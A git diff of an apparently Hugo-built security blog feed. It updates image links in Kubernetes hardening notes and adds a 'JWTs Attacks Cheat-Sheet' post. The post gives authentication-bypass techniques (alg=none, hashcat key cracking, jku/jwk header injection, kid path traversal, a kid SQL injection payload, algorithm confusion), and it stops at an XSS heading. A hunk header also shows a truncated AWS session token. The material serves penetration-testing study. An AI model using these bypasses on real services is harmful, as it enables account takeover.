 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create -f admin-user-serviceaccount.yaml
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create -f admin-user-clusterrole&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;binding.yaml
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can now create the bearer token of the admin user with the following command. The command will generate a token for the provided ServiceAccount object and render it on the console.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create token admin-user -n kubernetes-dashboard
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 223627.png]]&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_223627.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Go to the Dashboard and feed it the token to access.&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 153249.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_153249.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;creating-a-user-with-restricted-privileges&#34;&gt;Creating a User with Restricted Privileges&lt;/h3&gt;
 &lt;p&gt;In the previous section, you learned how to create a user with cluster-wide admin‐ istrative permissions. Most users of the Dashboard only need a restricted set of per‐ missions, though. For example, developers implementing and operating cloud-native applications will likely only need a subset of administrative permissions to perform their tasks on a Kubernetes cluster.&lt;/p&gt;
 &lt;p&gt;Creating a user for the Dashboard with restricted privileges consists of a three-step approach:&lt;/p&gt;
@@ -406,9 +407,9 @@ aws_session_token=IQoJb3JpZ2luX....
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;developer-user&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kubernetes-dashboard&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create token developer-user -n kubernetes-dashboard
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 223352.png]]&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_223352.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Developer user cannot delete a pod, let&amp;rsquo;s try;&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 155914.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_155914.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;An error message rendered when trying to invoke a permitted operation.&lt;/p&gt;
 &lt;h3 id=&#34;avoiding-insecure-configuration-arguments&#34;&gt;Avoiding Insecure Configuration Arguments&lt;/h3&gt;
 &lt;p&gt;Securing the Dashboard in production environments involves the usage of execution arguments necessary for properly configuring authentication and authorization. By default, login functionality is enabled and the HTTPS endpoint will be exposed on port 8443. You can provide TLS certificates with the &amp;ndash;tls-cert-file and &amp;ndash;tlscert-key command line options if you don’t want them to be auto-generated.&lt;/p&gt;
@@ -433,7 +434,7 @@ aws_session_token=IQoJb3JpZ2luX....
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubeadm: OK 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The previous command returned with an “OK” message. The binary file wasn’t tampered with. Any other message indicates a potential security risk when executing the binary&lt;/p&gt;
 &lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 130827.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_130827.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;h4 id=&#34;understand-the-purpose-and-effects-of-network-policies&#34;&gt;Understand the Purpose and Effects of Network Policies&lt;/h4&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Default Behavior&lt;/strong&gt;: By default, Pod-to-Pod communication is unrestricted.&lt;/li&gt;
@@ -763,6 +764,239 @@ weaknesses.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_234218.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;10---summary&#34;&gt;10 - Summary&lt;/h2&gt;
 &lt;p&gt;This blog covered the art of fuzzing APIs, one of the most important attack techniques you’ll need to master. By sending the right inputs to the right parts of an API request, you can discover a variety of API weaknesses. We covered two strategies, fuzzing wide and deep, useful for testing the entire attack surface of large APIs.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>JWTs Attacks Cheat-Sheet</title>
+      <link>http://localhost:1313/newblog/posts/jwts-attacks/</link>
+      <pubDate>Sun, 13 Aug 2023 11:47:29 +0100</pubDate>
+      
+      <guid>http://localhost:1313/newblog/posts/jwts-attacks/</guid>
+      <description>Toolkits jwt.io hashcat JSON Web Key Burpsuite Extension jwt_tool.py rsa_sign2n I - JWKS common locations If you don&amp;rsquo;t know what JWTs are yet, please check https://jwt.io/introduction, it&amp;rsquo;ll take you about 5 minutes to read.
+First thing we can do, is looking for any exposed JWTs keys (or set of keys) on common locations (JSON Web Key Store) file. Some common locations for this would be:
+/.well-known/jwks.json /openid/connect/jwks.json /jwks.json /api/keys /api/v1/keys To automate this, you can use common.</description>
+      <content>&lt;h2 id=&#34;toolkits&#34;&gt;Toolkits&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://jwt.io&#34;&gt;jwt.io&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;hashcat&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;JSON Web Key&lt;/code&gt; Burpsuite Extension&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;jwt_tool.py&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;rsa_sign2n&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/1aAH0mMomx1dLidhoNCVmNw.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;i---jwks-common-locations&#34;&gt;I - JWKS common locations&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;If you don&amp;rsquo;t know what JWTs are yet, please check &lt;a href=&#34;https://jwt.io/introduction&#34;&gt;https://jwt.io/introduction&lt;/a&gt;, it&amp;rsquo;ll take you about 5 minutes to read.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;First thing we can do, is looking for any exposed JWTs keys (or set of keys) on common locations (JSON Web Key Store) file. Some common locations for this would be:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;/.well-known/jwks.json&lt;/li&gt;
+&lt;li&gt;/openid/connect/jwks.json&lt;/li&gt;
+&lt;li&gt;/jwks.json&lt;/li&gt;
+&lt;li&gt;/api/keys&lt;/li&gt;
+&lt;li&gt;/api/v1/keys&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To automate this, you can use &lt;code&gt;common.txt&lt;/code&gt; wordlist under Web-Contet directory on the SecLists Github Repository:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -u &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;TARGET&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;.com/FUZZ -w ~/tools/SecLists-2023.2/Discovery/Web-Content/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There are two standard header claims that can direct the service to the &lt;strong&gt;Public Key&lt;/strong&gt; for verification:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;jku&lt;/strong&gt; - a claim pointing towards the JWKS URL&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;x5u&lt;/strong&gt; - a claim pointing towards the X509 certificate location (could be in a JWKS file)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This is how JWTs keys would look like :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;keys&amp;#34;&lt;/span&gt;: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kty&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSA&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AQAB&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kid&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ii---attacks-on-jwt&#34;&gt;II - Attacks on JWT&lt;/h2&gt;
+&lt;h3 id=&#34;21---jwt-authentication-bypass-via-unverified-signature&#34;&gt;2.1 - JWT authentication bypass via unverified signature&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Just change the JWT body(=payload) and send the request leaving the signature as is and check if the server is checking the signature.
+( For example if in the payload part of the token you can just change &amp;ldquo;name&amp;rdquo; to another user&amp;rsquo;s name and use the updated token to see if you can access his account )&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;22---jwt-authentication-bypass-via-flawed-signature-verification&#34;&gt;2.2 - JWT authentication bypass via flawed signature verification&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Change Body&lt;/li&gt;
+&lt;li&gt;Change &lt;em&gt;alg&lt;/em&gt; to &lt;strong&gt;none&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Remove Signature part (Not the dot at the end)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;23---jwt-authentication-bypass-via-weak-signing-key&#34;&gt;2.3 - JWT authentication bypass via weak signing key&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Crack Key used for Signature&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; -m &lt;span style=&#34;color:#ae81ff&#34;&gt;16500&lt;/span&gt; &amp;lt;YOUR-JWT&amp;gt; /path/to/jwt.secrets.list
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Change body in &lt;a href=&#34;https://jwt.io&#34;&gt;jwt.io&lt;/a&gt; and enter Key in Trailer field&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;24---jwt-authentication-bypass-via-jwk-header-injection&#34;&gt;2.4 - JWT authentication bypass via jwk header injection&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Generate RSA&lt;/li&gt;
+&lt;li&gt;Repeater -&amp;gt; JSON Web Token TAB -&amp;gt; Attack -&amp;gt; Embedded JWK&lt;/li&gt;
+&lt;li&gt;Notice &lt;em&gt;jwk&lt;/em&gt; added in header&lt;/li&gt;
+&lt;li&gt;Change body&lt;/li&gt;
+&lt;li&gt;Send request&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Instead of using the built-in attack in the JWT Editor extension, you can embed a JWK by adding a &lt;code&gt;jwk&lt;/code&gt; parameter to the header of the JWT manually. In this case, you need to also update the &lt;code&gt;kid&lt;/code&gt; header of the token to match the &lt;code&gt;kid&lt;/code&gt; of the embedded key.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;25---jwt-authentication-bypass-via-jku-header-injection&#34;&gt;2.5 - JWT authentication bypass via jku header injection&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Generate RSA&lt;/li&gt;
+&lt;li&gt;Copy PK as JWK&lt;/li&gt;
+&lt;li&gt;Create an endpoint of the PK:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;keys&amp;#34;&lt;/span&gt;: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kty&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSA&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AQAB&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kid&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Change &lt;em&gt;kid&lt;/em&gt; in you cookie with the generated one and &lt;strong&gt;Inject&lt;/strong&gt; &lt;em&gt;jku&lt;/em&gt; in the header the link to the endpoint containing our key :&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;alg&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RS256&amp;#34;&lt;/span&gt;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;jku&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://mysite.com/keys.json&amp;#34;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Sign it in Burp &lt;strong&gt;JSON Web Key&lt;/strong&gt; extention&lt;/li&gt;
+&lt;li&gt;Send request&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;26---jwt-authentication-bypass-via-kid-header&#34;&gt;2.6 - JWT authentication bypass via kid header&lt;/h3&gt;
+&lt;h4 id=&#34;261---path-traversal&#34;&gt;2.6.1 - Path Traversal&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;kid&lt;/code&gt; is an optional header claim which holds a key identifier, particularly useful when you have multiple keys to sign the tokens and you need to look up the right one to verify the signature.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;Generate Symetric Key with &lt;code&gt;key = null byte&lt;/code&gt; base64 encoded (AA==)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_19_231603.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Change &lt;em&gt;kid&lt;/em&gt; to &lt;code&gt;/dev/null&lt;/code&gt; which represent Null byte&lt;/li&gt;
+&lt;li&gt;Change Body&lt;/li&gt;
+&lt;li&gt;Sign with the generated Key&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_19_232035.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;262---sql-injection&#34;&gt;2.6.2 - SQL Injection&lt;/h4&gt;
+&lt;p&gt;In a scenario where the content of the &amp;ldquo;kid&amp;rdquo; is used to retreive the password from the database, you could change the payload inside the &amp;ldquo;kid&amp;rdquo; parameter to: &lt;code&gt;non-existent-index&#39; UNION SELECT &#39;ATTACKER&#39;;-- -&lt;/code&gt; and then sign the JWT with the secret key &lt;code&gt;ATTACKER&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;27---jwt-authentication-bypass-via-algorithm-confusion&#34;&gt;2.7 - JWT authentication bypass via algorithm confusion&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/&#34;&gt;https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Get &lt;strong&gt;Public Key&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Get &lt;strong&gt;Public Keys&lt;/strong&gt; from [[#JWKS common locations]]&lt;/li&gt;
+&lt;li&gt;or Crack it with &lt;code&gt;jwt_forgery.py&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;or use this :&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl s_client -connect example.com:443 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &amp;lt; /dev/null | sed -n &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/-----BEGIN/,/-----END/p&amp;#39;&lt;/span&gt; &amp;gt; certificatechain.pem 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl x509 -pubkey -in certificatechain.pem -noout &amp;gt; pubkey.pem
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or we can use this&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 jwt_forgery&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;jwt1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;jwt2&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_003929.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To verify if the public key generated is right :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 jwt_tool&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;V &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;pk &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;jwt_key&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt; to verify &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; its right
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_005548.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Or you can verify by using the &lt;strong&gt;Tampered x509 JWT&lt;/strong&gt; and sending the request, if you get &lt;em&gt;200&lt;/em&gt; then it&amp;rsquo;s your account and it is the correct X.509 key.  Else repeat the Public key derivation Process.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Copy &lt;strong&gt;Public Key&lt;/strong&gt; with the blank line at the end !!
+&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_011040.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;PEM&lt;/strong&gt; to &lt;strong&gt;JWK&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Generate RSA key using the &lt;strong&gt;JWK&lt;/strong&gt; we got from &lt;strong&gt;PEM&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Generate New Symetric Key with &lt;strong&gt;base64 Encoded PEM&lt;/strong&gt; in &lt;em&gt;k&lt;/em&gt; value :&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_012443.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Change &lt;code&gt;alg&lt;/code&gt; parameter to &lt;code&gt;HS256&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Change body as you like&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Sign it using the symetric Key&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Send Request&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key&#34;&gt;JWT authentication bypass via algorithm confusion with no exposed key&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;iii---stealing-jwts&#34;&gt;III - Stealing JWTs&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;There&amp;rsquo;s no need to hack JWTs if you can &lt;strong&gt;steal&lt;/strong&gt; and replay them!&lt;/p&gt;
+&lt;p&gt;If you have other vulnerabilities in the application you may be able to steal or hijack the tokens of other users.&lt;/p&gt;
+&lt;h3 id=&#34;31---xss&#34;&gt;3.1 - XSS&lt;/h3&gt;
